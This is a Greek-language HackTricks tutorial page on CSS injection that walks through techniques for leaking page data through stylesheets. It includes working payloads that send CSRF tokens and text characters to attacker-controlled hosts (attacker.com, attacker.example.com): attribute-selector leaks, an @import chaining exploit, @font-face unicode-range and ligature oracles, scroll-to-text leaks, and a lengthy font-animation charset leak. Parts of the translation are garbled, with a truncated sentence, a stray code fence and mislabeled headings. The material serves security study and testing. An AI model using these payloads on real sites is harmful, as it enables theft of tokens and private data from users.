# Εισαγωγή CSS

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Εισαγωγή CSS

### Επιλογέας Χαρακτηριστικού

Οι επιλογείς CSS δημιουργούνται για να ταιριάζουν με τιμές των χαρακτηριστικών `name` και `value` ενός στοιχείου `input`. Εάν το χαρακτηριστικό τιμής του στοιχείου εισόδου ξεκινά με ένα συγκεκριμένο χαρακτήρα, φορτώνεται ένα προκαθορισμένο εξωτερικό πόρο:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
Ωστόσο, αυτή η προσέγγιση αντιμετωπίζει μια περιορισμένη λειτουργία όταν ασχολείται με κρυφά στοιχεία εισόδου (`type="hidden"`) επειδή τα κρυφά στοιχεία δεν φορτώνουν φόντα.

#### Παράκαμψη για Κρυφά Στοιχεία

Για να παρακάμψετε αυτόν τον περιορισμό, μπορείτε να επιλέξετε ένα επόμενο αδελφό στοιχείο χρησιμοποιώντας το γενικό συνδυαστή `~`. Ο κανόνας CSS εφαρμόζεται σε όλα τα αδέλφια που ακολουθούν το κρυφό στοιχείο εισόδου, προκαλώντας τη φόρτωση της εικόνας φόντου:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Ένα πρακτικό παράδειγμα εκμετάλλευσης αυτής της τεχνικής περιγράφεται στον παρεχόμενο κώδικα. Μπορείτε να τον δείτε [εδώ](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Προαπαιτήσεις για την εκμετάλλευση της CSS Injection

Για να είναι αποτελεσματική η τεχνική της CSS Injection, πρέπει να πληρούνται ορισμένες προϋποθέσεις:

1. **Μήκος του Payload**: Ο διάνυσμα εισαγωγής CSS πρέπει να υποστηρίζει αρκετά μεγάλα payloads για να χωρέσει τους δημιουργημένους επιλογείς.
2. **Επαναξιολόγηση του CSS**: Πρέπει να έχετε τη δυνατότητα να πλαισιώσετε τη σελίδα, που είναι απαραίτητο για να ενεργοποιηθεί η επαναξιολόγηση του CSS με τα νεοδημιουργημένα payloads.
3. **Εξωτερικοί Πόροι**: Η τεχνική υποθέτει τη δυνατότητα χρήσης εικόνων που φιλοξενούνται εξωτερικά. Αυτό μπορεί να περιορίζεται από την πολιτική ασφαλείας περιεχομένου (Content Security Policy - CSP) του ιστότοπου.

### Τυφλός Επιλογέας Χαρακτηριστικών

Όπως [**εξηγείται σε αυτήν την ανάρτηση**](https://portswigger.net/research/blind-css-exfiltration), είναι δυνατό να συνδυαστούν οι επιλογείς **`:has`** και **`:not`** για να αναγνωριστεί περιεχόμενο ακόμα και από τυφλά στοιχεία. Αυτό είναι πολύ χρήσιμο όταν δεν έχετε ιδέα τι περιέχει η ιστοσελίδα που φορτώνει την εισαγωγή CSS.\
Είναι επίσης δυνατό να χρησιμοποιηθούν αυτοί οι επιλογείς για να εξαχθούν πληροφορίες από διάφορα τμήματα του ίδιου τύπου, όπως στο παράδειγμα:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Συνδυάζοντας αυτό με την ακόλουθη τεχνική **@import**, είναι δυνατόν να εξαγάγετε πολλές πληροφορίες χρησιμοποιώντας την ενσωμάτωση CSS από τυφλές σελίδες με το [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Η προηγούμενη τεχνική έχει μερικά μειονεκτήματα, ελέγξτε τις προϋποθέσεις. Είτε πρέπει να είστε σε θέση να **στείλετε πολλούς συνδέσμους στο θύμα**, είτε πρέπει να είστε σε θέση να **ενσωματώσετε την ευπάθεια της ενσωμάτωσης CSS σελίδας**.

Ωστόσο, υπάρχει μια άλλη έξυπνη τεχνική που χρησιμοποιεί το **CSS `@import`** για να βελτιώσει την ποιότητα της τεχνικής.

Αυτό πρωτοεμφανίστηκε από τον [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) και λειτουργεί ως εξής:

Αντί να φορτώνετε την ίδια σελίδα ξανά και ξανά με δεκάδες διαφορετικά φορτία κάθε φορά (όπως στην προηγούμενη), θα **φορτώσουμε τη σελίδα μόνο μία φορά και μόνο με ένα import στον διακομιστή του επιτιθέμενου** (αυτό είναι το φορτίο που θα στείλουμε στο θύμα):
```css
@import url('//attacker.com:5001/start?');
```
1. Η εισαγωγή θα **λάβει ορισμένο CSS script** από τους επιτιθέμενους και ο **περιηγητής θα το φορτώσει**.
2. Το πρώτο μέρος του CSS script που θα στείλει ο επιτιθέμενος είναι **ένα άλλο `@import` προς τον διακομιστή των επιτιθέμενων**.
1. Ο διακομιστής των επιτιθέμενων δεν θα απαντήσει ακόμη σε αυτό το αίτημα, καθώς θέλουμε να διαρρεύσουμε μερικούς χαρακτήρες και στη συνέχεια να απαντήσουμε σε αυτήν την εισαγωγή με το φορτίο για να διαρρεύσουμε τους επόμενους.
3. Το δεύτερο και μεγαλύτερο μέρος του φορτίου θα είναι ένα **διαρροής χαρακτήρων με επιλογέα γνωρισμάτων**.
1. Αυτό θα στείλει στον διακομιστή των επιτιθέμενων τον **πρώτο χαρακτήρα του μυστικού και τον τελευταίο**.
4. Μόλις ο διακομιστής των επιτιθέμενων λάβει τον **πρώτο και τελευταίο χαρακτήρα του μυστικού**, θα **απαντήσει στην εισαγωγή που ζητήθηκε στο βήμα 2**.
1. Η απάντηση θα είναι ακριβώς η ίδια με τα **βήματα 2, 3 και 4**, αλλά αυτή τη φορά θα προσπαθήσει να **βρει τον δεύτερο χαρακτήρα του μυστικού και στη συνέχεια τον προτελευταίο**.

Ο επιτιθέμενος θα **ακολουθήσει αυτόν τον κύκλο μέχρι να καταφέρει να διαρρεύσει πλήρως το μυστικό**.

Μπορείτε να βρείτε το αρχικό [**κώδικα του Pepe Vila για την εκμετάλλευση αυτής της ευπάθειας εδώ**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ή μπορείτε να βρείτε σχεδόν τον [**ίδιο κώδικα αλλά σχολιασμένο εδώ**](./#css-injection)

{% hint style="info" %}
Το script θα προσπαθήσει να ανακαλύψει 2 χαρακτήρες κάθε φορά (από την αρχή και από το τέλος) επειδή ο επιλογέας γνωρισμάτων επιτρέπει να γίνουν πράγματα όπως:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Αυτό επιτρέπει στο σενάριο να διαρρεύσει το μυστικό πιο γρήγορα.
{% endhint %}

{% hint style="warning" %}
Μερικές φορές το σενάριο **δεν ανιχνεύει σωστά ότι το ανακαλυφθέν πρόθεμα + επίθημα είναι ήδη η πλήρης σημαία** και θα συνεχίσει προς τα εμπρός (στο πρόθεμα) και προς τα πίσω (στο επίθημα) και σε κάποιο σημείο θα κολλήσει.\
Μην ανησυχείτε, απλά ελέγξτε την **έξοδο** επειδή **μπορείτε να δείτε εκεί τη σημαία**.
{% endhint %}

### Άλλοι επιλογείς

Άλλοι τρόποι για να έχετε πρόσβαση σε μέρη του DOM με **επιλογείς CSS**:

* **`.class-to-search:nth-child(2)`**: Αυτό θα αναζητήσει το δεύτερο στοιχείο με την κλάση "class-to-search" στο DOM.
*   **`:empty`** επιλογέας: Χρησιμοποιείται για παράδειγμα στο [**αυτό το writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### Βασισμένη σε σφάλματα XS-Search

**Αναφορά:** [Επίθεση βασισμένη σε CSS: Κατάχρηση του unicode-range του @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC από τον @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Ο συνολικός σκοπός είναι να **χρησιμοποιήσετε ένα προσαρμοσμένο γραμματοσειρά από έναν ελεγχόμενο τερματικό** και να διασφαλίσετε ότι **ο κείμενος (σε αυτήν την περίπτωση, 'A') εμφανίζεται με αυτήν τη γραμματοσειρά μόνο εάν η καθορισμένη πηγή (`favicon.ico`) δεν μπορεί να φορτωθεί**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Χρήση Προσαρμοσμένης Γραμματοσειράς**:
- Μια προσαρμοσμένη γραμματοσειρά ορίζεται χρησιμοποιώντας τον κανόνα `@font-face` μέσα σε ένα `<style>` tag στην ενότητα `<head>`.
- Η γραμματοσειρά ονομάζεται `poc` και ανακτάται από έναν εξωτερικό προορισμό (`http://attacker.com/?leak`).
- Η ιδιότητα `unicode-range` ορίζεται σε `U+0041`, στοχεύοντας το συγκεκριμένο Unicode χαρακτήρα 'A'.

2. **Στοιχείο Object με Εναλλακτικό Κείμενο**:
- Δημιουργείται ένα στοιχείο `<object>` με `id="poc0"` στην ενότητα `<body>`. Αυτό το στοιχείο προσπαθεί να φορτώσει ένα πόρο από το `http://192.168.0.1/favicon.ico`.
- Το `font-family` για αυτό το στοιχείο ορίζεται σε `'poc'`, όπως ορίζεται στην ενότητα `<style>`.
- Εάν ο πόρος (`favicon.ico`) αποτύχει να φορτωθεί, το εναλλακτικό περιεχόμενο (το γράμμα 'A') μέσα στο `<object>` tag εμφανίζεται.
- Το εναλλακτικό περιεχόμενο ('A') θα εμφανιστεί χρησιμοποιώντας την προσαρμοσμένη γραμματοσειρά `poc` εάν ο εξωτερικός πόρος δεν μπορεί να φορτωθεί.

### Στυλιστική Αναζήτησης Κειμένου με Κύλιση

Η ψευδοκλάση **`:target`** χρησιμοποιείται για να επιλέξει ένα στοιχείο που επιλέγεται από ένα **απόσπασμα URL**, όπως καθορίζεται στο [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Είναι σημαντικό να κατανοήσουμε ότι το `::target-text` δεν ταιριάζει με κανένα στοιχείο εκτός εάν το κείμενο επιλέγεται ρητά από το απόσπασμα.

Προκύπτει μια ανησυχία ασφαλείας όταν οι επιτιθέμενοι εκμεταλλεύονται τη δυνατότητα του αποσπάσματος **Κύλισης-προς-κείμενο**, επιτρέποντάς τους να επιβεβαιώσουν την παρουσία συγκεκριμένου κειμένου σε μια ιστοσελίδα φορτώνοντας έναν πόρο από τον διακομιστή τους μέσω ενσωμάτωσης HTML. Η μέθοδος περιλαμβάνει την ενσωμάτωση ενός κανόνα CSS όπως αυτός:
```css
:target::before { content : url(target.png) }
```
Σε τέτοια σενάρια, εάν το κείμενο "Διαχειριστής" είναι παρόν στη σελίδα, ο διακομιστής αιτείται το αρχείο `target.png`, υποδεικνύοντας την παρουσία του κειμένου. Μια περίπτωση αυτής της επίθεσης μπορεί να εκτελεστεί μέσω ενός ειδικά δημιουργημένου URL που ενσωματώνει το εισαχθέν CSS μαζί με ένα κομμάτι κειμένου που κατευθύνει σε αυτό.
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Εδώ, η επίθεση παραποιεί την εισαγωγή HTML για να μεταδώσει τον κώδικα CSS, με στόχο το συγκεκριμένο κείμενο "Διαχειριστής" μέσω του κομματιού Scroll-to-text (`#:~:text=Διαχειριστής`). Εάν το κείμενο βρεθεί, φορτώνεται ο καθορισμένος πόρος, αποκαλύπτοντας ακούσια την παρουσία του στον επιτιθέμενο.

Για τη μείωση του κινδύνου, πρέπει να ληφθούν υπόψη τα εξής σημεία:

1. **Περιορισμένη Αντιστοίχιση STTF**: Το Scroll-to-text Fragment (STTF) σχεδιάστηκε για να αντιστοιχίζει μόνο λέξεις ή προτάσεις, περιορίζοντας έτσι τη δυνατότητά του να διαρρεύσει αυθαίρετα μυστικά ή διαπιστευτήρια.
2. **Περιορισμός σε Περιβάλλοντα Περιήγησης Κορυφαίου Επιπέδου**: Το STTF λειτουργεί μόνο σε περιβάλλοντα περιήγησης κορυφαίου επιπέδου και δεν λειτουργεί εντός iframes, καθιστώντας οποιαδήποτε προσπάθεια εκμετάλλευσης πιο εμφανή στον χρήστη.
3. **Ανάγκη Ενεργοποίησης από τον Χρήστη**: Το STTF απαιτεί μια κίνηση ενεργοποίησης από τον χρήστη για να λειτουργήσει, πράγμα που σημαίνει ότι οι εκμεταλλεύσεις είναι εφικτές μόνο μέσω πλοήγησης που προκαλεί ο ίδιος ο χρήστης. Αυτή η απαίτηση μειώνει σημαντικά τον κίνδυνο αυτοματοποιημένων επιθέσεων χωρίς αλληλεπίδραση του χρήστη. Ωστόσο, ο συγγραφέας του άρθρου αναφέρει συγκεκριμένες συνθήκες και παρακάμψεις (π.χ. κοινωνική μηχανική, αλληλεπίδραση με δημοφιλείς πρόσθετα περιηγητή) που μπορεί να διευκολύνουν την αυτοματοποίηση της επίθεσης.

Η ενημέρωση για αυτούς τους μηχανισμούς και τις πιθανές ευπάθειες είναι καίρια για τη διατήρηση της ασφάλειας του web και την προστασία από τέτοιες εκμεταλλευτικές τακτικές.

Για περισσότερες πληροφορίες, ανατρέξτε στην αρχική αναφορά: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Μπορείτε να ελέγξετε ένα [**exploit που χρησιμοποιεί αυτήν την τεχνική για ένα CTF εδώ**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Μπορείτε να καθορίσετε **εξωτερικές γραμματοσειρές για συγκεκριμένες τιμές unicode** που θα συλλέγονται μόνο εάν αυτές οι τιμές unicode είναι παρούσες στη σελίδα. Για παράδειγμα:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Όταν αποκτήσετε πρόσβαση σε αυτήν τη σελίδα, το Chrome και το Firefox ανακτούν τα "?A" και "?B" επειδή το κείμενο του ευαίσθητων πληροφοριών περιέχει τους χαρακτήρες "A" και "B". Ωστόσο, το Chrome και το Firefox δεν ανακτούν το "?C" επειδή δεν περιέχει το "C". Αυτό σημαίνει ότι καταφέραμε να διαβάσουμε τα "A" και "B".

### Εξαγωγή κειμένου από κόμβο (I): συνδετήρες <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Αναφορά:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Η τεχνική που περιγράφεται περιλαμβάνει την εξαγωγή κειμένου από έναν κόμβο εκμεταλλευόμενη τους συνδετήρες γραμματοσειράς και την παρακολούθηση των αλλαγών στο πλάτος. Η διαδικασία περιλαμβάνει αρκετά βήματα:

1. **Δημιουργία προσαρμοσμένων γραμματοσειρών**:
- Οι γραμματοσειρές SVG δημιουργούνται με γλυφές που έχουν το χαρακτηριστικό `horiz-adv-x`, το οποίο ορίζει ένα μεγάλο πλάτος για μια γλυφή που αναπαριστά μια ακολουθία δύο χαρακτήρων.
- Παράδειγμα γλυφής SVG: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, όπου "XY" υποδηλώνει μια ακολουθία δύο χαρακτήρων.
- Αυτές οι γραμματοσειρές μετατρέπονται στη συνέχεια σε μορφή woff χρησιμοποιώντας το fontforge.

2. **Ανίχνευση αλλαγών στο πλάτος**:
- Χρησιμοποιείται CSS για να διασφαλιστεί ότι το κείμενο δεν αναδιπλώνεται (`white-space: nowrap`) και για να προσαρμοστεί το στυλ της γραμμής κύλισης.
- Η εμφάνιση μιας οριζόντιας γραμμής κύλισης, με ξεχωριστό στυλ, λειτουργεί ως ένδειξη (οράκλ) ότι μια συγκεκριμένη συνδετήρας, και επομένως μια συγκεκριμένη ακολουθία χαρακτήρων, είναι παρούσα στο κείμενο.
- Το CSS που εμπλέκεται:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Εκμετάλλευση της διαδικασίας**:
- **Βήμα 1**: Δημιουργία γραμματοσειρών για ζευγάρια χαρακτήρων με μεγάλο πλάτος.
- **Βήμα 2**: Χρησιμοποιείται ένα κόλπο με βάση τη γραμμή κύλισης για να ανιχνευθεί πότε αποτυπώνεται η γλυφή με μεγάλο πλάτος (συνδετήρας για ένα ζευγάρι χαρακτήρων), που υποδηλώνει την παρουσία της ακολουθίας χαρακτήρων.
- **Βήμα 3**: Μετά την ανίχνευση μιας συνδετήρας, δημιουργούνται νέες γλυφές που αναπαριστούν ακολουθίες τριών χαρακτήρων, συμπεριλαμβάνοντας το ανιχνευμένο ζευγάρι και προσθέτοντας έναν προηγούμενο ή επόμενο χαρακτήρα.
- **Βήμα 4**: Πραγματοποιείται η ανίχνευση της τριών χαρακτήρων συνδετήρας.
- **Βήμα 5**: Η διαδικασία επαναλαμβάνεται, αποκαλύπτοντας σταδιακά ολόκληρο το κείμενο.

4. **Βελτιστοποίηση**:
- Η τρέχουσα μέθοδος αρχικοποίησης με τη χρήση `<meta refresh=...` δεν είναι βέλτιστη.
- Μια πιο αποδοτική προσέγγιση θα μπορούσε να περιλαμβάνει το κόλπο `@import` του CSS, βελτιώνοντας την απόδοση της εκμετάλλευσης.

### Εξαγωγή κειμένου από κόμβο (II): διαρροή του συνόλου χαρακτήρων με μια προεπιλεγμένη γραμματοσειρά (χωρίς απαιτούμενα εξωτερικά στοιχεία) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Αναφορά:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Αυτό το κόλπο δημοσιεύτηκε σε αυτό το [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). Το σύνολο χαρακτήρων που χρησιμοποιείται σε έναν κόμβο κειμένου μπορεί να διαρρεύσει **χρησιμοποιώντας τις προεπιλεγμένες γραμματοσειρές** που είναι εγκατεστημένες στον περιηγητή: δεν απαιτούνται εξωτερικές -ή προσαρμοσμένες- γραμματοσειρές.

Η ιδέα περιστρέφεται γύρω από τη χρήση μιας κινούμενης εικόνας για να αυξήσει σταδιακά το πλάτος ενός `div`, επιτρέποντας έναν χαρακτήρα κάθε φορά να μεταβεί από το τμήμα 'επίθημα' του κειμένου στο τμήμα 'πρόθεμα'. Αυτή η διαδικασία χωρίζει α
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* πλευρική διαρροή */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Αποκλεισμός κειμένου από κόμβο (III): διαρροή του συνόλου χαρακτήρων με προεπιλεγμένη γραμματοσειρά κρύβοντας στοιχεία (χωρίς απαιτούμενα εξωτερικά στοιχεία) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Αναφορά:** Αναφέρεται ως [μια ανεπιτυχής λύση σε αυτήν την ανάλυση](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Αυτή η περίπτωση είναι πολύ παρόμοια με την προηγούμενη, ωστόσο, σε αυτήν την περίπτωση, ο στόχος του να κάνουμε συγκεκριμένους **χαρακτήρες μεγαλύτερους από άλλους είναι να κρύψουμε κάτι** όπως ένα κουμπί για να μην πατηθεί από το bot ή μια εικόνα που δεν θα φορτωθεί. Έτσι, μπορούμε να μετρήσουμε την ενέργεια (ή την έλλειψη ενέργειας) και να γνωρίζουμε αν ένας συγκεκριμένος χαρακτήρας είναι παρόν μέσα στο κείμενο.

### Αποκλεισμός κειμένου από κόμβο (III): διαρροή του συνόλου χαρακτήρων με χρονομέτρηση προσωρινής μνήμης (χωρίς απαιτούμενα εξωτερικά στοιχεία) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Αναφορά:** Αναφέρεται ως [μια ανεπιτυχής λύση σε αυτήν την ανάλυση](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Σε αυτήν την περίπτωση, μπορούμε να προσπαθήσουμε να διαρρεύσουμε αν ένας χαρακτήρας βρίσκεται στο κείμενο φορτώνοντας μια πλαστή γραμματοσειρά από την ίδια προέλευση:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Εάν υπάρχει αντιστοιχία, η γραμματοσειρά θα φορτωθεί από το `/static/bootstrap.min.css?q=1`. Αν και δεν θα φορτωθεί με επιτυχία, ο περιηγητής θα το αποθηκεύσει στην μνήμη cache, και ακόμη και αν δεν υπάρχει cache, υπάρχει ένας μηχανισμός **304 not modified**, οπότε η απόκριση θα είναι πιο γρήγορη από άλλα πράγματα.

Ωστόσο, εάν η διαφορά χρόνου μεταξύ της αποθηκευμένης απόκρισης και της μη αποθηκευμένης δεν είναι αρκετά μεγάλη, αυτό δεν θα είναι χρήσιμο. Για παράδειγμα, ο συγγραφέας ανέφερε: Ωστόσο, μετά από δοκιμές, διαπίστωσα ότι το πρώτο πρόβλημα είναι ότι η ταχύτητα δεν είναι πολύ διαφορετική, και το δεύτερο πρόβλημα είναι ότι το bot χρησιμοποιεί τη σημαία `disk-cache-size=1`, που είναι πραγματικά προσεκτική.

